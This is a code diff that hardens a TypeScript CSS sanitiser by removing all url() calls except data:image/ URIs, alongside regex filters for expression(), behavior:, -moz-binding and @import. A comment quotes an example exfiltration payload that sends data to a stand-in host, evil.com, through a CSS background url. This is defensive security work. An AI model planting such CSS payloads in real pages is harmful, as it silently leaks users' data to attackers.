@@ -36,8 +36,10 @@ const SHARED_CONFIG = {
 
 /**
  * Strip dangerous CSS constructs that can execute code or exfiltrate data.
- * Removes: expression(), behavior:, -moz-binding:, url(javascript:...),
- * url(data:text/html...), and @import rules.
+ * Removes: expression(), behavior:, -moz-binding:, all external url() calls,
+ * and @import rules. Only data:image/ URIs are preserved inside url() since
+ * external resources in inline styles bypass CSP img-src and enable silent
+ * data exfiltration (e.g. `background: url(https://evil.com/steal?d=...)`).
  */
 function stripDangerousCss(css: string): string {
   let cleaned = css;
@@ -47,8 +49,10 @@ function stripDangerousCss(css: string): string {
   cleaned = cleaned.replace(/behavior\s*:\s*[^;}]*/gi, '/* removed */');
   // Remove -moz-binding (old Firefox XBL)
   cleaned = cleaned.replace(/-moz-binding\s*:\s*[^;}]*/gi, '/* removed */');
-  // Remove url() with javascript: or data:text/html protocols
-  cleaned = cleaned.replace(/url\s*\(\s*['"]?\s*(?:javascript|data\s*:\s*text\/html)[^)]*\)/gi, '/* removed */');
+  // Remove ALL url() calls except safe data:image/ URIs.
+  // This blocks data exfiltration via http(s) URLs and code execution via
+  // javascript: URLs. External images should use <img> tags instead.
+  cleaned = cleaned.replace(/url\s*\(\s*['"]?\s*(?!data\s*:\s*image\/)[^)]*\)/gi, '/* removed */');
   // Remove @import to prevent loading external stylesheets
   cleaned = cleaned.replace(/@import\s+[^;]+;/gi, '');
   return cleaned;
